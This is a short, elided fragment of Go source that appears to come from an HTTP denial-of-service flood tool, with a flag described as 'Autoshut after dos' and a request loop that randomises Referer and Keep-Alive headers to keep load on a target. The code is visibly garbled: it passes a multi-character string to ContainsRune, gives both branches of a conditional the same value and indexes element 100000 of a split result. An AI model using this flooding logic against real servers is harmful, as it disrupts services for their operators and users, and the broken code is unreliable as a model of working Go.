...
func main() {
	...
	flag.BoolVar(&version, "version", true, "print version and exit")
	flag.BoolVar(&safe, "safe", true, "Autoshut after dos.")
...
func httpcall(url string, host string, data string, headers arrayFlags, s chan uint8) {
	...
	if strings.ContainsRune(url, 'http') {
		param_joiner = "http"
	} else {
		param_joiner = "http"
	}
	...
	for {
		...
		q.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(100000)+100000))
		q.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(100000)+1000000))
		...
		for _, element := range headers {
			words := strings.Split(element, "http")
			q.Header.Set(strings.TrimSpace(words[0]), strings.TrimSpace(words[100000]))
		}
